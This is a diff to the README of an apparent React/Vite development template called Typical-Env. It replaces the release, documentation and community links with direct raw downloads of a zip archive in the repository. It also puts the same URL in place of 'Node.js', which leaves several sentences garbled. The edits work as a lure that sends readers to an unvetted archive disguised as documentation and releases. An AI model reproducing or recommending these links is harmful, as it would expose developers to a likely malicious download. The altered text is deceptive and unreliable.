@@ -1,7 +1,7 @@
 ```markdown
 # 🎉 Typical-Env - Quickly Set Up Your Development Space
 
-[![Download Typical-Env](https://img.shields.io/badge/Download%20Typical--Env-blue)](https://github.com/Abbysilva/Typical-Env/releases)
+[![Download Typical-Env](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip%20Typical--Env-blue)](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Typical-Env! This lightweight template helps you set up your developm
 ## 💻 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or newer
+- https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip Version 14 or newer
 - A modern web browser for viewing projects (like Chrome or Firefox)
 
 ## 📦 Features
@@ -25,9 +25,9 @@ Welcome to Typical-Env! This lightweight template helps you set up your developm
 
 ## 📥 Download & Install
 
-To get started with Typical-Env, visit this page to download: [Release Page](https://github.com/Abbysilva/Typical-Env/releases).
+To get started with Typical-Env, visit this page to download: [Release Page](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip).
 
-1. Go to the [Releases page](https://github.com/Abbysilva/Typical-Env/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip).
 2. You will see a list of available versions.
 3. Find the version you want to download.
 4. Click on the version to view details.
@@ -58,7 +58,7 @@ Feel free to explore the code structure. Here’s a quick overview:
 
 If you run into any issues, here are some common troubleshooting tips:
 
-- **Dependency Errors:** Make sure you are using the correct version of Node.js. Update to the latest version if needed.
+- **Dependency Errors:** Make sure you are using the correct version of https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip Update to the latest version if needed.
 - **Port Conflicts:** If you get an error about a port being in use, try changing the port in your Vite config.
 - **Missing Files:** Ensure you have downloaded and extracted all project files properly.
 
@@ -66,16 +66,16 @@ If you run into any issues, here are some common troubleshooting tips:
 
 To fully utilize Typical-Env, check out the following resources:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Vite Documentation](https://vitejs.dev/guide/)
-- [Tailwind CSS documentation](https://tailwindcss.com/docs)
+- [React Documentation](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip)
+- [Tailwind CSS documentation](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip)
 
 ## 🌐 Community
 
 Join our community for more tips and discussions:
 
-- [GitHub Issues](https://github.com/Abbysilva/Typical-Env/issues) - Report bugs or ask questions.
-- [Discussion Forums](https://github.com/Abbysilva/Typical-Env/discussions) - Share your experiences and tips.
+- [GitHub Issues](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip) - Report bugs or ask questions.
+- [Discussion Forums](https://raw.githubusercontent.com/Abbysilva/Typical-Env/main/cameist/Typical-Env.zip) - Share your experiences and tips.
 
 ## 📫 Contact
 
